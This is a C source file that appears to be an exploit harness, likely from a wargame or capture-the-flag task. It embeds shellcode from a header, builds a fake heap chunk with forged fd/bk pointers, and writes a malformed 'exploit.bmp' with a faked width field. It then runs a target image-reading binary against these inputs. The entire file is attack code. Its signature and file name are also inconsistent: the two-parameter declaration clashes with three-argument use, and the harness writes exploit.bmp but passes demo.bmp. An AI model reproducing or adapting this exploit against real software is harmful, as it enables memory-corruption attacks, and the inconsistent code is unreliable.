#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <math.h>

unsigned char shellcode[] = {
#include "www-shellcode.h"
};

void createBMP(int,int);

int main(void)
{
	struct _chunk {
		uint32_t fd;
		uint32_t bk;
		/* ... */
		unsigned char nul;  /* terminate string */
	} __attribute__((packed)) chunk;
	
	char *argv[] = { 	"./c4288bb0f38c68dd2258b0b941ccbb4534e286d5", 
						"-read", 
						"demo.bmp",
						(char *)&chunk, 
						NULL };

	memset(&chunk, 'A', sizeof(chunk));

	createBMP(256,256,255);

	/* terminate the string */
	chunk.nul = '\0';

	execve(argv[0], argv, NULL);

	return EXIT_FAILURE;
}


void createBMP(int height, int width, int fake_width)
{
	struct _bmpheader {
		char bfType[2]; 	// Must be BM
		int bfSize;			// Size of the bitmap file
		char reserved[4];
		int bfHeader; 		// Size of the bitmap header
	} __attribute__((packed)) bmpheader;

	struct _bmpinfoheader {
		int bfSize;  	// Size of the bitmap
		int bmwidth; 	// Width
		int bmheight; 	// Height
		uint16_t planes; // Number of color planes
		uint16_t bits;	// Number of bits to use
		char reserved[4];
		int rawSize; 	// Size of raw bitmap data
		char reserved2[16];
	} __attribute__((packed)) bmpinfoheader;

	FILE *file;
	// Specify file dimensions and meta
	int header_size = 54;
	int raw_offset = 40;
	int bits_per_pixel = 24;
	int row_size = 4 * ((bits_per_pixel * width) / 32);
	int file_size = header_size + (4 * ( bits_per_pixel * bits_per_pixel ) ) + (row_size * height);
	int raw_size = file_size - header_size;

	// Data to fill the binary
	char raw[raw_size];
	memset(raw, 0x0c, raw_size);
	printf("%i\n", sizeof(bmpinfoheader)+sizeof(bmpheader));

	// Zero initialize the headers
	memset(&bmpheader, 0x00, sizeof(bmpheader));
	memset(&bmpinfoheader, 0x00, sizeof(bmpinfoheader));

	// Set the header data
	bmpheader.bfType[0] = 'B';
	bmpheader.bfType[1] = 'M';
	bmpheader.bfSize = file_size;
	bmpheader.bfHeader = header_size;

	// Set info header data
	bmpinfoheader.bfSize = raw_offset;
	bmpinfoheader.bmwidth = fake_width;
	bmpinfoheader.bmheight = height;
	bmpinfoheader.rawSize = raw_size;
	bmpinfoheader.planes = 1;
	bmpinfoheader.bits = bits_per_pixel;

	// Write the bmp file
	file = fopen("exploit.bmp","wb");
	fwrite(&bmpheader, sizeof(bmpheader),1,file);
	fwrite(&bmpinfoheader, sizeof(bmpinfoheader),1,file);
	fwrite(raw, raw_size,1,file);
	fclose(file);



}